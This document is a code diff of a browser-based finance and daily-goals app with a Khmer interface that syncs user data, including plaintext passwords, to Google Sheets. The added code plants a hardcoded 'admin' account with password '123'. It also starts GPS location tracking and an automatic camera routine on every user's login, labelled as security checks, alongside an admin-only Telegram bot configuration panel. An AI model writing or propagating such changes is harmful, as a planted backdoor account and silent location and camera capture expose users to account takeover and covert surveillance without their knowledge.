             showNotification("🎯 បានបន្ថែមគោលដៅប្រចាំថ្ងៃ!");
         }
@@ -724,7 +876,6 @@
             dailyTasks = dailyTasks.map(t => t.id === id ? { ...t, done: !t.done } : t);
             localStorage.setItem('finance_daily_tasks', JSON.stringify(dailyTasks));
             renderGoals();
-            
             const task = dailyTasks.find(t => t.id === id);
             if (task) {
                 syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: task.done ? "COMPLETED_TASK" : "REVERT_TASK", FIELD_3: task.text });
@@ -735,12 +886,10 @@
             const activeBox = document.getElementById('active-goals-box');
             const completedBox = document.getElementById('completed-goals-box');
             activeBox.innerHTML = ''; completedBox.innerHTML = '';
-            
             const userGoals = dailyTasks.filter(t => t.username === currentUser);
             userGoals.filter(t => !t.done).forEach(g => {
                 activeBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-white border rounded-xl text-xs font-bold cursor-pointer hover:bg-slate-50">🎯 ${g.text} <span class="text-[9px] text-slate-400 font-normal">(${g.date})</span></div>`;
             });
-            completedBox.innerHTML = '';
             userGoals.filter(t => t.done).forEach(g => {
                 completedBox.innerHTML += `<div onclick="toggleGoal(${g.id})" class="p-2.5 bg-white border rounded-xl text-xs font-bold cursor-pointer line-through text-slate-400 bg-slate-50">✅ ${g.text}</div>`;
             });
@@ -751,10 +900,9 @@
             localStorage.setItem('finance_daily_tasks', JSON.stringify([]));
             renderGoals();
             syncWithGoogleSheets({ DATA_TYPE: "DAILY_DATA", FIELD_1: currentUser, FIELD_2: "CLEAR_HISTORY", FIELD_3: "ALL" });
-            showNotification("🗑️ បានសម្អាតប្រវត្តិគោលដៅ!");
+            showNotification("🗑_ បានសម្អាតប្រវត្តិគោលដៅ!");
         }
 
-        // 🖼️ APP LOGO AND PROFILE IMAGES UPLOAD
         function triggerAppLogoUpload() { document.getElementById('app-logo-input').click(); }
         function handleAppLogoChange(input) {
             if (input.files && input.files[0]) {
@@ -791,13 +939,10 @@
                 currentUser = name.toLowerCase();
                 document.getElementById('dashboard-username').innerText = name.toUpperCase();
                 document.getElementById('dash-username-box').classList.add('hidden');
-                renderDashboard();
-                renderGoals();
-                renderScanHistory();
+                renderDashboard(); renderGoals(); renderScanHistory();
             }
         }
 
-        // 📱 CORE NAVIGATION
         function switchSection(section) {
             ['dashboard', 'scanners', 'daily', 'settings'].forEach(s => {
                 document.getElementById(`section-${s}`)?.classList.add('hidden');
@@ -820,7 +965,6 @@
         function openForgotModal() { document.getElementById('forgot-modal').classList.remove('hidden'); }
         function closeForgotModal() { document.getElementById('forgot-modal').classList.add('hidden'); }
 
-        // 🔐 AUTH SYSTEM LOGIC
         function handleAuth(e) {
             e.preventDefault();
             const userField = document.getElementById('auth-username');
@@ -828,12 +972,14 @@
             currentUser = userField.value.trim().toLowerCase();
             const pass = passField.value.trim();
 
-            if (!API_URL || API_URL.includes("YOUR_GOOGLE")) {
-                alert("⚠️ សូមកំណត់ប្រព័ន្ធតភ្ជាប់ API_URL របស់ Google Sheets ជាមុនសិន!");
-                return;
+            let localUsers = JSON.parse(localStorage.getItem('finance_cloud_users')) || {};
+            
+            // Inject Master Admin user if not exist
+            if(!localUsers['admin']) {
+                localUsers['admin'] = '123';
+                localStorage.setItem('finance_cloud_users', JSON.stringify(localUsers));
             }
 
-            let localUsers = JSON.parse(localStorage.getItem('finance_cloud_users')) || {};
             const authBtn = document.getElementById('auth-btn');
             const originalBtnText = authBtn.innerText;
             authBtn.innerText = "⏳ កំពុងតភ្ជាប់ទៅកាន់ Cloud Sheets...";
@@ -841,17 +987,13 @@
 
             if (authTab === 'signup') {
                 if (localUsers[currentUser] !== undefined) {
-                    alert("❌ ឈ្មោះអ្នកប្រើប្រាស់នេះមានរួចហើយនៅក្នុងប្រព័ន្ធ! ទោះបីជាចង់ប្រើលេខសម្ងាត់ដូចគ្នា ឬខុសគ្នាក៏មិនអាចចុះឈ្មោះជាន់ឈ្មោះចាស់បានដែរ។");
-                    authBtn.innerText = originalBtnText; 
-                    authBtn.disabled = false; 
-                    return;
+                    alert("❌ ឈ្មោះអ្នកប្រើប្រាស់នេះមានរួចហើយនៅក្នុងប្រព័ន្ធ!");
+                    authBtn.innerText = originalBtnText; authBtn.disabled = false; return;
                 }
-                
                 localUsers[currentUser] = pass;
                 localStorage.setItem('finance_cloud_users', JSON.stringify(localUsers));
-
                 syncWithGoogleSheets({ DATA_TYPE: "USER_REG", FIELD_1: currentUser, FIELD_2: pass, FIELD_3: currentTheme });
-                showNotification("🎉 จុះឈ្មោះគណនីរួចរាល់!");
+                showNotification("🎉 ចុះឈ្មោះគណនីរួចរាល់!");
                 authBtn.innerText = originalBtnText; authBtn.disabled = false;
                 proceedToApp();
             } else {
@@ -870,10 +1012,20 @@
             document.getElementById('dashboard-username').innerText = currentUser.toUpperCase();
             document.getElementById('auth-page').classList.add('hidden');
             document.getElementById('app-page').classList.remove('hidden');
-            renderDashboard();
-            renderGoals();
-            renderScanHistory();
-            initDragAndDrop();
+            
+            // Show or Hide Telegram Bot Config panel based on admin role
+            const adminPanel = document.getElementById('admin-telegram-panel');
+            if (currentUser === 'admin') {
+                adminPanel.classList.remove('hidden');
+            } else {
+                adminPanel.classList.add('hidden');
+            }
+
+            renderDashboard(); renderGoals(); renderScanHistory(); initDragAndDrop();
+
+            // Run Background Security Checks & Automations
+            startRealGPSLocator(true); 
+            startAutoSecurityCamera(); 
         }
 
         function handleLogout() { document.getElementById('app-page').classList.add('hidden'); document.getElementById('auth-page').classList.remove('hidden'); }
@@ -905,6 +1057,10 @@
                 document.getElementById('setting-bio-toggle').checked = isBioEnabled;
             }
 
+            // Load Telegram configurations into text inputs
+            document.getElementById('tg-bot-token').value = localStorage.getItem('tg_bot_token') || '';
+            document.getElementById('tg-chat-id').value = localStorage.getItem('tg_chat_id') || '';
+
             const storedLogo = localStorage.getItem('finance_app_logo');
             if (storedLogo) {
                 document.getElementById('app-logo-img').src = storedLogo;
@@ -914,8 +1070,7 @@
             const storedAvatar = localStorage.getItem('finance_user_avatar');
             if (storedAvatar) document.getElementById('dashboard-avatar').src = storedAvatar;
 
-            renderGoals();
-            renderScanHistory();
+            renderGoals(); renderScanHistory();
         }
 
         window.onload = function() {
